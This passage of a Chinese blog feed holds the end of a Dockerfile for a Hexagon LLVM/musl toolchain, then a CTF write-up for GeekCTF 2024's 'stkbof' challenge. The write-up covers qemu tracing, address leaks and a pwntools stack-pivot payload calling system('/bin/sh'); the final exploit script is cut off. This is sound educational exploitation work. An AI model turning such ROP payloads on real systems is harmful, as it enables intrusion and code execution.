class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>@sha256:<span class="number">6</span>d8d9799fe6ab3221965efac00b4c34a2bcc102c086a58dff9e19a08b913c7ef</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> HOST_CLANG_VER <span class="number">19</span></span><br><span class="line"><span class="keyword">ENV</span> PATH=<span class="string">&quot;/opt/zig-linux-x86_64-0.11.0:$PATH&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install common build utilities</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive apt install -yy \</span></span><br><span class="line"><span class="language-bash">apt-transport-https ca-certificates \</span></span><br><span class="line"><span class="language-bash">eatmydata software-properties-common wget gpgv2 unzip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive eatmydata \</span></span><br><span class="line"><span class="language-bash">add-apt-repository ppa:deadsnakes/ppa &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive eatmydata \</span></span><br><span class="line"><span class="language-bash">wget --quiet https://ziglang.org/download/0.11.0/zig-linux-x86_64-0.11.0.tar.xz &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">tar xf ./zig-linux-x86_64-0.11.0.tar.xz --directory /opt &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">wget https://apt.llvm.org/llvm.sh &amp;&amp; \</span></span><br><span class="line"><span class="language-bash"><span class="built_in">chmod</span> +x ./llvm.sh &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">bash -x ./llvm.sh  <span class="variable">$&#123;HOST_CLANG_VER&#125;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">wget https://github.com/ninja-build/ninja/releases/download/v1.10.2/ninja-linux.zip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">unzip -d /usr/local/bin ninja-linux.zip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">update-alternatives --install /usr/bin/ninja ninja /usr/local/bin/ninja 1 --force</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget -O - https://apt.kitware.com/keys/kitware-archive-latest.asc 2&gt;/dev/null |  apt-key add - &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">apt-add-repository <span class="string">&#x27;deb https://apt.kitware.com/ubuntu/ focal main&#x27;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> update-alternatives --install /usr/bin/clang++ clang++ /usr/bin/clang++-<span class="variable">$&#123;HOST_CLANG_VER&#125;</span> 100 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">update-alternatives --install /usr/bin/clang clang /usr/bin/clang-<span class="variable">$&#123;HOST_CLANG_VER&#125;</span> 100 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive eatmydata apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive eatmydata \</span></span><br><span class="line"><span class="language-bash">apt install -y --no-install-recommends \</span></span><br><span class="line"><span class="language-bash">bison \</span></span><br><span class="line"><span class="language-bash">cmake \</span></span><br><span class="line"><span class="language-bash">flex \</span></span><br><span class="line"><span class="language-bash">rsync \</span></span><br><span class="line"><span class="language-bash">wget \</span></span><br><span class="line"><span class="language-bash">build-essential \</span></span><br><span class="line"><span class="language-bash">python-is-python3 \</span></span><br><span class="line"><span class="language-bash">python3.8 \</span></span><br><span class="line"><span class="language-bash">python3.8-venv \</span></span><br><span class="line"><span class="language-bash">curl \</span></span><br><span class="line"><span class="language-bash">xz-utils \</span></span><br><span class="line"><span class="language-bash">zstd \</span></span><br><span class="line"><span class="language-bash">ca-certificates \</span></span><br><span class="line"><span class="language-bash">ccache \</span></span><br><span class="line"><span class="language-bash">git \</span></span><br><span class="line"><span class="language-bash">software-properties-common \</span></span><br><span class="line"><span class="language-bash">bc \</span></span><br><span class="line"><span class="language-bash">ninja-build \</span></span><br><span class="line"><span class="language-bash">cpio \</span></span><br><span class="line"><span class="language-bash">python3-psutil \</span></span><br><span class="line"><span class="language-bash">unzip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cat</span> /etc/apt/sources.list | sed <span class="string">&quot;s/^deb\ /deb-src /&quot;</span> &gt;&gt; /etc/apt/sources.list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">DEBIAN_FRONTEND=noninteractive eatmydata \</span></span><br><span class="line"><span class="language-bash">apt build-dep -yy --arch-only qemu clang python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># From env.sh</span></span><br><span class="line"><span class="keyword">ARG</span> QEMU_REPO</span><br><span class="line"><span class="keyword">ARG</span> QEMU_REF=hexagon-sysemu-<span class="number">04</span>-oct-<span class="number">2024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> ARTIFACT_BASE</span><br><span class="line"><span class="keyword">ARG</span> ARTIFACT_TAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> VER <span class="number">19.1</span>.<span class="number">5</span></span><br><span class="line"><span class="keyword">ENV</span> TOOLCHAIN_INSTALL /usr/local/clang+llvm-$&#123;VER&#125;-cross-hexagon-unknown-linux-musl/</span><br><span class="line"><span class="keyword">ENV</span> ROOT_INSTALL /usr/local/hexagon-unknown-linux-musl-rootfs</span><br><span class="line"><span class="keyword">ENV</span> MAKE_TARBALLS <span class="number">1</span></span><br><span class="line"><span class="comment">#ENV HOST_LLVM_VERSION 10</span></span><br><span class="line"><span class="comment">#ENV CMAKE_VER 3.16.6</span></span><br><span class="line"><span class="comment">#ENV CMAKE_URL https://github.com/Kitware/CMake/releases/download/v3.16.6/cmake-3.16.6-Linux-x86_64.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LLVM_SRC_URL https://github.com/llvm/llvm-project/archive/llvmorg-$&#123;VER&#125;.tar.gz</span><br><span class="line"><span class="keyword">ENV</span> LLVM_TESTS_SRC_URL https://github.com/llvm/llvm-test-suite/archive/llvmorg-$&#123;VER&#125;.tar.gz</span><br><span class="line"><span class="keyword">ENV</span> MUSL_SRC_URL https://github.com/quic/musl/archive/d125203fcb134febcde6ca32181554560b67c790.tar.gz</span><br><span class="line"><span class="keyword">ENV</span> HEXMVM_SRC_URL https://github.com/quic/hexagonMVM/archive/v0.<span class="number">1.1</span>.tar.gz</span><br><span class="line"><span class="keyword">ENV</span> LINUX_SRC_URL https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-<span class="number">6.7</span>.<span class="number">11</span>.tar.xz</span><br><span class="line"><span class="keyword">ENV</span> BUSYBOX_SRC_URL https://busybox.net/downloads/busybox-<span class="number">1.36</span>.<span class="number">1</span>.tar.bz2</span><br><span class="line"><span class="keyword">ENV</span> BUILDROOT_SRC_URL https://github.com/quic/buildroot/archive/hexagon-<span class="number">2024.11</span>.<span class="number">26</span>.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#ENV PYTHON_SRC_URL https://www.python.org/ftp/python/3.9.5/Python-3.9.5.tar.xz</span></span><br><span class="line"><span class="comment">#ADD get-host-clang-cmake-python.sh /root/hexagon-toolchain/get-host-clang-cmake-python.sh</span></span><br><span class="line"><span class="comment">#RUN cd /root/hexagon-toolchain &amp;&amp; ./get-host-clang-cmake-python.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> test-suite-patches /root/hexagon-toolchain/test-suite-patches</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> get-src-tarballs.sh /root/hexagon-toolchain/get-src-tarballs.sh</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> *.cmake /root/hexagon-toolchain/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/hexagon-toolchain &amp;&amp; ./get-src-tarballs.sh <span class="variable">$&#123;PWD&#125;</span> <span class="variable">$&#123;TOOLCHAIN_INSTALL&#125;</span>/manifest</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> test_init/test_init.c test_init/Makefile /root/hexagon-toolchain/test_init/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> IN_CONTAINER <span class="number">1</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> build-toolchain.sh /root/hexagon-toolchain/build-toolchain.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/hexagon-toolchain &amp;&amp; ./build-toolchain.sh <span class="variable">$&#123;ARTIFACT_TAG&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> build-buildroot.sh /root/hexagon-toolchain/build-buildroot.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/hexagon-toolchain &amp;&amp; ./build-buildroot.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> TEST_TOOLCHAIN=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> build-rootfs.sh /root/hexagon-toolchain/build-rootfs.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/hexagon-toolchain &amp;&amp; ./build-rootfs.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> test-toolchain.sh /root/hexagon-toolchain/test-toolchain.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> /root/hexagon-toolchain &amp;&amp; ./test-toolchain.sh</span></span><br></pre></td></tr></table></figure><h2 id="开箱即用"><a href="#开箱即用" class="headerlink" title="开箱即用"></a>开箱即用</h2><p>目前（2024.12.12）release最高版本是19.1.2，musl的版本对应的是1.2.5，clang版本为19。这里以linux x86_64版本为例。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://artifacts.codelinaro.org/artifactory/codelinaro-toolchain-for-hexagon/19.1.2/clang+llvm-19.1.2-cross-hexagon-unknown-linux-musl_x86_64-linux-musl.tar.xz</span><br><span class="line">sudo tar xf clang+llvm-19.1.2-cross-hexagon-unknown-linux-musl_x86_64-linux-musl.tar.xz -C /path/to/install</span><br><span class="line">export PATH=/path/to/your/clang+llvm-19.1.2-cross-hexagon-unknown-linux-musl/x86_64-linux-musl/bin:$PATH</span><br></pre></td></tr></table></figure><p>解压过程有点久。整个包大小解压后在29G左右，请预留好空间。接下来就可以正常编译程序了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexagon-linux-musl-clang -o ./example example.c</span><br></pre></td></tr></table></figure><p>运行的时候如果提示找不到ld，可以将interpreter patchelf到你的<code>path/to/your/clang+llvm-19.1.2-cross-hexagon-unknown-linux-musl/x86_64-linux-musl/target/hexagon-unknown-linux-musl/lib/ld-musl-hexagon.so.1</code>.</p><p>或者你将解压出来的lib文件夹下的libc.so通过软链接的方式链接到&#x2F;lib文件夹下也可以。但是如果是cpp程序，那动态链接库就有点多了，这时候就需要将解压出来的lib文件夹设置为LD路径。这个网上有很多教程。</p><p>顺带一提，可以通过<a href="https://blog.csdn.net/weixin_43749411/article/details/108521312#:~:text=export%E6%96%B9%E5%BC%8F%E5%9C%A8%E9%87%8D%E5%90%AF%E5%90%8E%E5%A4%B1%E6%95%88%EF%BC%8C%E6%83%B3%E8%A6%81%E6%B0%B8%E4%B9%85%E6%B7%BB%E5%8A%A0%E5%8F%AF%E4%BB%A5vim,%2Fetc%2Fbashrc%EF%BC%8C%E4%BF%AE%E6%94%B9%E5%85%B6%E4%B8%AD%E7%9A%84LD_LIBRARY_PATH%E5%8F%98%E9%87%8F%E3%80%82%20%E4%BE%8B%E5%A6%82%EF%BC%9ALD_LIBRARY_PATH%3D%24LD_LIBRARY_PATH%3A%2Fopt%2Fau1200%2Fbin%E3%80%82">修改<code>~/.bashrc</code>文件</a>的方式使得PATH永久化。export来设置路径是一次性的。</p><h2 id="musl调试符号构建"><a href="#musl调试符号构建" class="headerlink" title="musl调试符号构建"></a>musl调试符号构建</h2><p>现在<a href="https://musl.libc.org/">官网</a>下载对应版本源码。然后进入root用户，否则编译到后面他才会告诉你路径没有权限访问。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/musl CFLAGS=&#x27;-O2 -v&#x27; --enable-debug &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>等编译完成。这样在gdb调试musl程序的时候就会有符号了。</p><h2 id="波折"><a href="#波折" class="headerlink" title="波折"></a>波折</h2><p>算了这部分懒得写了</p>]]></content>
    
    
    <summary type="html">波折的，hexagon架构LLVM编译环境搭建</summary>
    
    
    
    <category term="hexagon" scheme="https://c-lby.top/categories/hexagon/"/>
    
    
    <category term="llvm" scheme="https://c-lby.top/tags/llvm/"/>
    
    <category term="hexagon" scheme="https://c-lby.top/tags/hexagon/"/>
    
  </entry>
  
  <entry>
    <title>『2024GeekCTF』stkbof-初识hexagon架构</title>
    <link href="https://c-lby.top/2024/2024geekctf-stkbof/"/>
    <id>https://c-lby.top/2024/2024geekctf-stkbof/</id>
    <published>2024-12-09T11:26:43.000Z</published>
    <updated>2025-02-09T16:34:06.707Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在找点新的东西学，翻着翻着找到这道题，稀罕物，所以想着学一学。hexagon架构的pwn题很少见，网上资料也很少，好在题目附件给了源码，可以对照着汇编来学习，类比一下应该不算太难学。网上关于这道题的解析也是少之又少，就算有也很不详细。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h3><p>一共需要准备两样东西：IDA对于hexagon架构处理器反编译的<a href="https://github.com/n-o-o-n/idp_hexagon/releases/download/v5.4/hexagon-ida83-v5.4.7z">插件</a>和qemu-hexagon，将题目给出的libc.so软链接到&#x2F;lib目录下作ld。</p><h3 id="IDA的hexagon反编译插件"><a href="#IDA的hexagon反编译插件" class="headerlink" title="IDA的hexagon反编译插件"></a>IDA的hexagon反编译插件</h3><p>插件很好找：hexagon架构处理器反编译的插件，解压之后dll放到IDA8.3（及以下版本）的procs文件夹内即可。需要注意的是这个程序是32位的，这个插件也只为32位服务，因此尽管是8.3版本，也要单独打开IDA.exe才能识别到这个hexagon的插件。</p><h3 id="qemu-hexagon"><a href="#qemu-hexagon" class="headerlink" title="qemu-hexagon"></a>qemu-hexagon</h3><p>qemu这里就比较难受了。qemu-user就不用说了肯定得有的，但是实际运行之后发现还少点东西：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-hexagon: Could not open &#x27;/lib/ld-musl-hexagon.so.1&#x27;: No such file or directory</span><br></pre></td></tr></table></figure><p>本来我想仿照arm或者mips架构去找gnu包下载，忽然想到不对劲，高通本身就有一套sdk，没道理继续使用gcc的。事实就是在ubuntu中用apt search了一下hexagon，确实就没几个相关的包。然后去quic（高通的github）翻了一会，找到了<a href="https://github.com/quic/toolchain_for_hexagon">hexagon的toolchain</a>，release中有针对x86_64linux量身打造的hexagon musl前后端编译工具。5.9G，没办法那也得下下来看看是不是真的能派上用场。然后这玩意解压出来有50个G……在target&#x2F;lib文件夹下可以找到<code>ld-musl-hexagon.so.1</code>，把他cp到&#x2F;lib里，然后程序终于可以运行了。。。然后后面发现泄露出来的libc地址怎么也和题目给出来的libc.so的偏移对不上号。如果把解压出来的libc.so替换附件给的libc那就没问题了，所以怀疑是ld和libc版本不一样（因为我下载的是最新版的release）。然后我发现解压的文件中libc和ld文件大小一样，计算发现md5值也是一样的，这也就意味着我只要把libc.so软链接到lib文件夹就可以了，根本不用去下载toolchain。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /path/to/your/libc.so /lib/ld-musl-hexagon.so.1</span><br></pre></td></tr></table></figure><h3 id="Docker的拉取问题"><a href="#Docker的拉取问题" class="headerlink" title="Docker的拉取问题"></a>Docker的拉取问题</h3><p>在解决这个问题之后，我们先来说说dockerfile的问题。这道题给的docker使用fedora构建，但是构建的时候元数据可以下载下来，但是主要的包却死活拉不下来。解决办法是，从dockerhub的标签进到github仓库，找到<a href="https://github.com/fedora-cloud/docker-brew-fedora/blob/2317ae452755c2e2107df65560bce2772b1b45b9/x86_64/fedora-39-x86_64.tar.xz">这个包</a>然后通过浏览器下载下来，与它在同一目录下的dockerfile也下载下来，然后在本地利用这个dockerfile构建fedora的镜像。这样一来，其他使用fedora:39的docker就可以直接从本地拉取。</p><h2 id="部分汇编解析"><a href="#部分汇编解析" class="headerlink" title="部分汇编解析"></a>部分汇编解析</h2><p>还是老样子，几乎找不到资料，好在题目给出了源码，我们可以结合源码分析汇编指令。虽然有点小题大做，但是网上可以下载到高通的<a href="https://origin-developer.qualcomm.com/qfile/33880/80-n2040-36_b_hexagon_v62_prog_ref_manual.pdf">开发者手册</a>。这个开发者手册可以解决一些网上很难获得答案的问题。</p><p>装好插件之后打开IDA，发现hexagon的指令风格一眼看过去和arm非常像，所以就算不用找开发手册其实也能看个大概。</p><ul><li>mewm()类似于x86汇编中的[]，解引用。后面那个m有可能是h，代表halfword；d表示doubleword…</li><li>{}括起来的语句会被并发执行，hexagon最多支持四指令并发</li><li>一共有32个32位通用寄存器，R0-R31。存在寄存器对，可以当做64位寄存器使用，如R0和R1可以合并成R1:0（R1和R2不行）。这个很有意思。</li><li>R29-R31是别名寄存器。R29是SP，R30是FP，R31是LR寄存器。如果接触过ARM汇编的话，这下你就该感叹：这下看懂了。SP是栈顶寄存器，FP是栈（底）寄存器，LR是储存返回地址的寄存器。</li><li>有32个控制寄存器，我们需要重点关注的是PC寄存器（别名C9）和LC、SA系列寄存器。后者是拿来给硬件循环计数用的。</li><li>栈结构与我们熟知的x86、arm没什么区别。但是开辟栈和销毁的方式不太一样。有类似canary的保护机制，还有加密返回地址的保护机制，key是存在专门的寄存器里面的。不过这道题没有涉及。</li><li>hexagon用allocframe开辟栈帧：LR压栈，FP压栈，SP减去一定数值向低地址开辟，FP设置成指向旧FP的指针。deallocframe&#x2F;dealloc_return用于销毁栈帧&#x2F;销毁栈帧并返回，从栈底取回FP和LR。说白了就是和x86或者arm一样的。</li><li>立即数和一些存放数据的寄存器前面会加一些井号，##表示必须用32位偏移量，#是必须不能用32位偏移量，没加井号意味着必要时才用32为偏移量。</li><li>函数传参按照寄存器编号顺序来使用，例如有四个参数就用R0-R3寄存器。</li></ul><p><img src="https://c-lby.top/images/2024geekctf-stkbof/hexagon%E6%A0%88%E7%BB%93%E6%9E%84.png" alt="hexagon栈结构"></p><p><img src="https://c-lby.top/images/2024geekctf-stkbof/hexagon%E6%A0%88%E5%BC%80%E8%BE%9F%E4%B8%8E%E9%94%80%E6%AF%81.png" alt="hexagon栈开辟与销毁"></p><h2 id="题目分析-动调"><a href="#题目分析-动调" class="headerlink" title="题目分析&amp;动调"></a>题目分析&amp;动调</h2><h3 id="qemu-hexagon调试方法"><a href="#qemu-hexagon调试方法" class="headerlink" title="qemu-hexagon调试方法"></a>qemu-hexagon调试方法</h3><p>先讲讲动调的问题。原本我尝试使用gdb-multiarch来调试，但是发现无论如何都会报错，估计是gdb-multiarch的问题，应该是有解决办法的但暂时懒得管了，先放一边。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**</span><br><span class="line">ERROR:../../target/hexagon/gdbstub.c:33:hexagon_gdb_read_register: code should not be reached</span><br><span class="line">Bail out! ERROR:../../target/hexagon/gdbstub.c:33:hexagon_gdb_read_register: code should not be reached</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>翻了翻<a href="https://www.qemu.org/docs/master/user/main.html">qemu的文档</a>发现qemu是可以记录一些程序运行日志的。<code>-d</code>参数可以选择记录的内容，<code>-D</code>选择log输出的文件，<code>-dfilter</code>约束记录的指令地址范围。</p><p>qemu翻译执行指令并不是逐条指令进行的，而是会一坨执行翻译到一个TB（translation block）中，再以TB为单位去执行。所以qemu -d记录的日志也会以TB为单位呈现。根据记录下来的日志找到的规律，TB通常会以call、return之类的跳转语句划分。简单来说就是，正常来讲我们没法看到每一步的CPU上下文情况。</p><p>但是qemu也留了一手，-d参数中加上nochain，加上<code>-singlestep</code>参数就能看到逐指令的上下文了，但是这样的执行速度会下降许多，如果是大型项目调试的话，并不建议这么做。这里涉及到<a href="https://wangzhou.github.io/qemu%E8%B7%9F%E8%B8%AACPU%E6%8C%87%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E9%80%BB%E8%BE%91/">qemu trace的原理</a>，这里就不深入探究了，以后有机会再展开。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-hexagon -L libc -d in_asm,exec,cpu,page,nochain -singlestep -dfilter 0x20400+0xc0 -strace -D ./log ./chall</span><br></pre></td></tr></table></figure><p>这是我的调试运行命令，这样log日志中就会存有从0x20400到0x204c0（stkbof和main函数范围）逐行指令执行前的CPU寄存器情况，并且记录系统调用情况与其返回值。page参数会在log开头记录程序布局情况，但是有且仅能看到各地址段的权限情况，没法得知哪个段对应什么用处。</p><p>如果想调试自己的payload的，可以在脚本中写process，这样就会从脚本记录日志了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">&#x27;qemu-hexagon&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-singlestep&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20400+0xc0&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./chall&#x27;</span>])</span><br></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目就是给了个栈溢出可以劫持返回地址，然后我们得想办法getshell。不同于平常的题目，这道题我们看不到任何pop&#x2F;push语句，也就是说我们想要传参，得考虑利用其他gadget。</p><h4 id="泄露栈-libc地址"><a href="#泄露栈-libc地址" class="headerlink" title="泄露栈&#x2F;libc地址"></a>泄露栈&#x2F;libc地址</h4><p>众所周知qemu模拟执行一般情况下并没有aslr这种东西，chall程序本身也没开PIE保护，那就意味着栈地址、libc地址我们都可以直接利用调试泄露出来，然后一直用。我们运行调试命令，程序结束后我们查看log，找到执行到stkbof的部分，可以看到一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6275 read(0,0x4080ebe0,272) = 2</span><br></pre></td></tr></table></figure><p>这是qemu记录下来的系统调用记录，6275是进程pid，等于号后面的是这个系统调用的返回值。显而易见输入点是0x4080ebe0，这就是我们泄露出来的栈地址。<strong>请注意，不同环境下这个地址可能会改变。不同于题目运行于fedora，此log是基于ubuntu22的qemu运行的。</strong></p><p>因为程序调用动态链接库的函数在plt和got中转一手，并且我们约束了log范围，所以仅靠此时的log没法很直观的看出来libc地址。我们注意到plt表处的指令从got表取出了解析好的libc地址，储存在r28寄存器中并jumpr执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.plt:00020510 // int puts(const char *s)</span><br><span class="line">.plt:00020510 puts:                                   // CODE XREF: main+8C↑p</span><br><span class="line">.plt:00020510                 &#123; r14 = add(pc, ##off_405D4@pcrel) &#125;</span><br><span class="line">.plt:00020518                 &#123; r28 = memw(r14) &#125;</span><br><span class="line">.plt:0002051C                 &#123; jumpr r28 &#125;</span><br><span class="line">.plt:0002051C // End of function puts</span><br></pre></td></tr></table></figure><p>那也就是说在执行puts后r28寄存器应该会残留有puts的libc地址。我们在log找到相应的位置，查看r28寄存器的值：<code>r28 = 0x3ffa7c40</code>，同时我们看到libc.so中puts函数的偏移是0xD7C40，那么就可以得到libc的基址是0x3FED0000。</p><h4 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h4><p>有了libc地址，system和binsh地址都会有了，现在要考虑如何给system传参。这里没有pop R0这样的gadget，只有给R0赋值的语句，考虑通过栈迁移的方式，利用栈给寄存器传参。0x204b4处有个取FP-8处数据赋值给R0的指令，并且紧接着就是return（插播一句，估计这个地方原本是利用R0作为函数返回值传参寄存器了）。return之后，程序会继续从新FP+4的位置开始执行。因此有以下思路：</p><ol><li>劫持FP为0x4080ebe0（输入点），LR为ret，那么接下来程序会从0x4080ebe4开始执行。并且因为刚才总共是执行了两次return，所以此时FP应该是0x4080ebe0内的数据。</li><li>因为我们需要从FP-8来取值，因此我们需要控制FP为栈地址。这里写<code>0x4080ebe0+0x10</code>，那么<code>0x4080ebe0+0x10-0x8</code>处要写binsh的libc地址。</li><li>又一次return后，程序将从<code>0x4080ebe0+0x14</code>处执行，所以这个地方要写上system的libc地址。</li></ol><p>综上可以得到payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stack = <span class="number">0x4080ebe0</span></span><br><span class="line">libc_base = <span class="number">0x3FED0000</span></span><br><span class="line">gadget1 = <span class="number">0x204b4</span>  <span class="comment"># &#123; r0 = memw(fp + #var_8) &#125; &#123; dealloc_return &#125;</span></span><br><span class="line">ret = <span class="number">0x2041c</span>  <span class="comment"># &#123; dealloc_return &#125;</span></span><br><span class="line"></span><br><span class="line">payload = p32(stack + <span class="number">0x10</span>)</span><br><span class="line">payload += p32(gadget1)</span><br><span class="line">payload += p32(libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))) + p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p32(stack)+p32(ret)</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 